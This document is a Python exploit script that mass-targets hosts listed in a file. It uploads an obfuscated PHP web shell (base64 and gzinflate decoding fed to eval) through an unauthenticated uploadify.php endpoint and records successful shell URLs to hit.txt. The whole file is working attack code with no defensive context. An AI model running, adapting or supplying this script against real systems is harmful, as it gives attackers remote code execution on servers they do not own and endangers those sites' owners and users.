import requests
import hashlib

def main():
    target_file = open("target.txt", "r")
    targets = target_file.readlines()
    target_file.close()
    for target in targets:
        poc(target.replace('\n', '').strip())
        
def calculate_md5(text):
    md5_hash = hashlib.md5(text.encode()).hexdigest()
    return md5_hash[:8]

def poc(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Referer": target
    }
    filename = calculate_md5(target) + ".php"
    files = {
        ("Filedata", (filename, '''<?php function VcegE($ZPWpB) { $ZPWpB=gzinflate(base64_decode($ZPWpB)); for($i=0;$i<strlen($ZPWpB);$i++) { $ZPWpB[$i] = chr(ord($ZPWpB[$i])-1); } return $ZPWpB; }eval(VcegE("lVBNT8JAEP0tHEi2TYTu7CeNqUYlXIwSAT/w0rTbLSoEklJj/z2zFFJCubiXybydee/N63Tc675m01VkCpuUNs5/16b83qy9bVnExaYE7pEu8fsnbY5tmmytEnFmzSazHkn/ougC+rJHT1YL4l+dDX3WQ+ar8GjFKfRoxQbpEUisMAGtwJg2+12zCMB0jwKV+gAIoRQNEAFRI1yzHnPf/3Fee8gT9BTKQ6s4k4DMjEJrbbwn86/3iXrnn7N59Uz6ZLZgY4r1fpUtR1i3jw+THCs5yEEYoh4I0aKfNK44SDxn0Bp5Ow2Fa4zBhaDRKmkkQFOGaUktjicCN6hp2nx2cSmeeWNESTagQahorTBS2XuJFT6mS4316Wch3NFDA+OhOzZyNjCi25sd"));?>''', "application/octet-stream")),
        ("file", ("", "", "application/octet-stream"))
    }
    print(f"[*]Now try: {target}")
    try:
        response = requests.post(target + "/inc/jquery/uploadify/uploadify.php", headers=headers, files=files, allow_redirects=False, timeout=5)
        if response.text.isdigit() == True and response.status_code == 200:
            file_url = f"{target}/attachment/{response.text}/{filename}"
            print(f"[+]Succeeded: {file_url}")
            f = open('hit.txt', 'a+')
            f.write(file_url + "\n")
            f.close()
        else:
            print(f"[-]{target} is not exploitable")
    except Exception as e:
        print(f"[-]{target} is not exploitable")

main()
